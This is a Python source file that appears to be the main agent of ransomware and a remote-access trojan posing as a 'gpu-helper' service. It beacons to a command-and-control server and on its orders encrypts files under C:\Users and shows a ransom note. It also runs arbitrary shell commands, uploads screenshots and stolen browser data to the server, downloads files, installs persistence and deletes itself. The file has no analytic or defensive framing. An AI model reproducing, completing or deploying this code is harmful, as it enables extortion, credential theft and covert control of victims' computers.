import os
import sys
import json
import random
import time
import socket
import subprocess
import threading
import platform
import tempfile
import urllib.parse
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from lib.persistence import (
    is_persistent,
    install_persistence,
    remove_persistence,
)
from lib.crypto_utils import (
    find_target_files,
    encrypt_file,
    decrypt_file,
    count_encrypted_files,
    ROGUEBYTE_HEADER,
    write_ransom_note,
    write_decrypt_sentinel,
)
from lib.c2_client import get_system_info, send_beacon, upload_file
from lib.evasion import run_evasion
from lib.browser_stealer import steal_all as steal_browser_data

from settings import C2_SERVER, TRAFFIC_KEY, PUBLIC_KEY_PEM, BUILD_NUMBER

SERVICE_NAME = "gpu-helper"
EXE_PATH = os.path.abspath(sys.argv[0])

TARGET_DIRS = ['C:\\Users']

BEACON_INTERVAL = 60


def exec_command(
    cmd: str, params: dict, files: list, agent_state: dict
) -> str:
    if cmd == 'encrypt':
        files[:] = find_target_files(TARGET_DIRS)
        return _encrypt_all(files)
    elif cmd == 'decrypt':
        private_key = params.get('private_key')
        if not private_key:
            return 'no private key provided'
        files[:] = find_target_files(TARGET_DIRS)
        return _decrypt_all(files, private_key)
    elif cmd == 'status':
        encrypted = count_encrypted_files(files)
        return f'{encrypted}/{len(files)} files encrypted'
    elif cmd == 'persist':
        if is_persistent(SERVICE_NAME):
            return 'already persistent'
        install_persistence(SERVICE_NAME, EXE_PATH)
        return 'persistence installed'
    elif cmd == 'exec':
        command = params.get('cmd', '')
        try:
            result = subprocess.run(
                command, shell=True, capture_output=True,
                text=True, timeout=30
            )
            output = result.stdout + result.stderr
            return output[:1000] if output else '(no output)'
        except Exception as e:
            return f'exec error: {e}'
    elif cmd == 'self_destruct':
        remove_persistence("gpu-helper")
        remove_persistence("hw-detect")
        for f in [".decrypt.txt", "README.txt"]:
            try:
                os.remove(f)
            except Exception:
                pass
        note = os.path.join(tempfile.gettempdir(), ".hw-tools", ".suicide_note")
        try:
            os.makedirs(os.path.dirname(note), exist_ok=True)
            with open(note, 'w') as f:
                f.write('self_destruct')
        except Exception:
            pass
        agent_state['result'] = 'self_destructed'
        send_beacon(C2_SERVER, agent_state, TRAFFIC_KEY)
        try:
            os.unlink(EXE_PATH)
        except Exception:
            pass
        os._exit(0)
    elif cmd == 'download':
        url = params.get('url', '')
        if not url:
            return 'no url provided'
        dest = params.get('path', '') or os.path.join(
            tempfile.gettempdir(), os.path.basename(url.split('?')[0])
        )
        try:
            resp = urllib.request.urlopen(url, timeout=30)
            with open(dest, 'wb') as f:
                f.write(resp.read())
            return f'downloaded to {dest}'
        except Exception as e:
            return f'download error: {e}'
    elif cmd == 'upload':
        path = params.get('path', '')
        if not path or not os.path.exists(path):
            return 'file not found'
        return upload_file(C2_SERVER, agent_state.get('hostname', ''), path)
    elif cmd == 'network_info':
        return _collect_network_info()
    elif cmd == 'show_ransomnote':
        return _show_ransom_note()
    elif cmd == 'screenshot':
        return _take_screenshot(agent_state.get('hostname', 'unknown'))
    elif cmd == 'pslist':
        return _list_processes()
    elif cmd == 'pskill':
        pid = params.get('pid', '')
        return _kill_process(pid)
    elif cmd == 'steal_browsers':
        return _steal_browsers(agent_state.get('hostname', 'unknown'))
    elif cmd == 'scare':
        return _run_scare(agent_state.get('hostname', 'unknown'))
    return f'unknown command: {cmd}'


def _encrypt_all(files: list) -> str:
    success = 0
    failed = 0
    for f in files:
        if encrypt_file(f, PUBLIC_KEY_PEM):
            success += 1
        else:
            failed += 1
    write_ransom_note()
    write_decrypt_sentinel()
    return f'encryption completed: {success} ok, {failed} failed'


def _decrypt_all(files: list, private_key_pem: str) -> str:
    success = 0
    failed = 0
    for f in files:
        if decrypt_file(f, private_key_pem):
            success += 1
        else:
            failed += 1
    return f'decryption completed: {success} ok, {failed} failed'


def _collect_network_info() -> str:
    try:
        lines = []
        for cmd in [['ipconfig', '/all'], ['netstat', '-an']]:
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                lines.append(r.stdout[:2000])
            except Exception:
                pass
        return '\n'.join(lines)[:3000] or 'no network info'
    except Exception as e:
        return f'network info error: {e}'


def _show_ransom_note() -> str:
    note_path = os.path.join(os.getcwd(), "README.txt")
    if not os.path.exists(note_path):
        write_ransom_note()
    try:
        subprocess.Popen(['notepad.exe', note_path],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return 'ransom note displayed'
    except Exception as e:
        return f'display error: {e}'


def _take_screenshot(hostname: str) -> str:
    tmp = os.path.join(tempfile.gettempdir(), '.screenshot.png')
    try:
        cmd = (
            'powershell -NoProfile -Command '
            '"Add-Type -AssemblyName System.Drawing; '
            '$bmp = [Drawing.Bitmap]::new('
            '[Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,'
            '[Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); '
            '$g = [Drawing.Graphics]::FromImage($bmp); '
            '$g.CopyFromScreen(0,0,0,0, $bmp.Size); '
            f'$bmp.Save(\\\"{tmp}\\\"); exit 0"'
        )
        subprocess.run(cmd, shell=True, timeout=15)
        if os.path.exists(tmp) and os.path.getsize(tmp) > 0:
            result = upload_file(C2_SERVER, hostname, tmp)
            os.unlink(tmp)
            return f'screenshot: {result}'
        return 'screenshot: failed (no tools available)'
    except Exception as e:
        return f'screenshot error: {e}'


def _list_processes() -> str:
    try:
        r = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=15)
        output = (r.stdout or '') + (r.stderr or '')
        return output[:3000] if output else '(no output)'
    except Exception as e:
        return f'pslist error: {e}'


def _kill_process(pid: str) -> str:
    if not pid or not pid.isdigit():
        return 'kill: invalid pid'
    pid_int = int(pid)
    if pid_int == os.getpid():
        return 'kill: cannot kill self'
    try:
        subprocess.run(['taskkill', '/PID', pid], capture_output=True, text=True, timeout=10)
        return f'kill: signal sent to {pid}'
    except Exception as e:
        return f'kill error: {e}'


def _steal_browsers(hostname: str) -> str:
    try:
        zip_path = steal_browser_data()
        if not zip_path:
            return 'steal: no browser data found'
        result = upload_file(C2_SERVER, hostname, zip_path)
        os.unlink(zip_path)
        return f'browser data: {result}'
    except Exception as e:
        return f'steal error: {e}'


def _run_scare(hostname: str) -> str:
    list_url = f"{C2_SERVER}/api/scare/gifs?list=1"
    try:
        resp = urllib.request.urlopen(list_url, timeout=10)
        gif_list = json.loads(resp.read())
    except Exception as e:
        return f'scare: failed to fetch gif list ({e})'
    if not gif_list:
        return 'scare: no gifs available'

    profile = os.environ.get('USERPROFILE', 'C:\\Users\\Default')
    temp_dir = tempfile.gettempdir()
    locations = [
        os.path.join(profile, 'Desktop'),
        os.path.join(profile, 'Downloads'),
        os.path.join(profile, 'Documents'),
        os.path.join(profile, 'DedSec'),
        os.path.join(temp_dir, 'DedSec'),
    ]
    for loc in locations:
        try:
            os.makedirs(loc, exist_ok=True)
        except Exception:
            pass

    downloaded = []
    for i, gif_name in enumerate(gif_list):
        try:
            gif_url = f"{C2_SERVER}/api/scare/gifs?file={urllib.parse.quote(gif_name)}"
            resp = urllib.request.urlopen(gif_url, timeout=30)
            data = resp.read()
            loc = locations[i % len(locations)]
            dest = os.path.join(loc, gif_name)
            with open(dest, 'wb') as f:
                f.write(data)
            downloaded.append(dest)
        except Exception:
            continue

    if not downloaded:
        return 'scare: failed to download any gifs'

    opened = 0
    to_open = downloaded[:5]
    for gif_path in to_open:
        try:
            subprocess.Popen(
                ['cmd', '/c', 'start', '', gif_path],
                shell=False,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            opened += 1
            time.sleep(0.3)
        except Exception:
            continue

    return f'scare: {len(downloaded)} gifs placed, {opened} opened'


def beacon_loop():
    info = get_system_info(lambda: is_persistent(SERVICE_NAME))
    info['agent'] = 'gpu_helper'
    info['type'] = 'installer'
    info['architecture'] = platform.machine()
    info['version'] = '1.0'
    info['build_number'] = BUILD_NUMBER
    status = "waiting"
    files_encrypted = 0
    last_result = None

    target_files = find_target_files(TARGET_DIRS)

    while True:
        info['persistent'] = is_persistent(SERVICE_NAME)
        info['result'] = last_result
        result = send_beacon(
            C2_SERVER, info, TRAFFIC_KEY
        )
        info.pop('result', None)

        if result and result.get('command'):
            cmd_data = result['command']
            cmd_name = cmd_data.get('command')
            cmd_params = cmd_data.get('params', {})

            if cmd_name == 'encrypt':
                t = threading.Thread(
                    target=_handle_command_async,
                    args=(cmd_name, cmd_params, target_files, info),
                    daemon=True
                )
                t.start()
            else:
                cmd_result = exec_command(
                    cmd_name, cmd_params, target_files, info
                )
                last_result = cmd_result
                if cmd_name == 'encrypt':
                    status = 'encrypted'
                    files_encrypted = count_encrypted_files(target_files)
                elif cmd_name == 'decrypt':
                    status = 'decrypted'
                    files_encrypted = 0

        info['status'] = status
        info['files_found'] = len(target_files)
        info['files_encrypted'] = files_encrypted

        jitter = random.randint(0, 30)
        time.sleep(BEACON_INTERVAL + jitter)


def _handle_command_async(
    cmd_name: str, cmd_params: dict, target_files: list, info: dict
):
    target_files[:] = find_target_files(TARGET_DIRS)
    result_text = _encrypt_all(target_files)
    info['result'] = result_text
    send_beacon(C2_SERVER, info, TRAFFIC_KEY)
    info['status'] = 'encrypted'
    info['files_found'] = len(target_files)
    info['files_encrypted'] = count_encrypted_files(target_files)


if __name__ == '__main__':
    run_evasion(EXE_PATH)
    target_files = find_target_files(TARGET_DIRS)
    beacon_loop()
